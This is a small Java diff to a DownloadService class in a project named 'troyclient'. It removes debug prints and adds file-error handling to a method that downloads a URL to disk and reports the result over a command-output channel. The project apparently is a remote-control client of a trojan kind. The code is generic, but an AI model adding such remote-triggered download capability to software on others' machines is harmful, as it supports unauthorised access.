@@ -1,7 +1,7 @@
 package ch.lebois.troyclient.service;
 
 import ch.lebois.troyclient.main.SystemVariables;
-
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.URL;
@@ -16,8 +16,6 @@ public class DownloadService {
 
     public void download(String url, String fileName) {
         URL website;
-        System.out.println(url);
-        System.out.println(fileName);
         try {
             website = new URL(url);
             ReadableByteChannel rbc = Channels.newChannel(website.openStream());
@@ -26,6 +24,8 @@ public class DownloadService {
             rbc.close();
             fos.close();
             SystemVariables.SENDER.send("commandout", "Downloaded File " + fileName);
+        } catch (FileNotFoundException e) {
+            System.err.println("Could not save file: " + fileName + " from " + url);
         } catch (IOException e) {
             e.printStackTrace();
         }
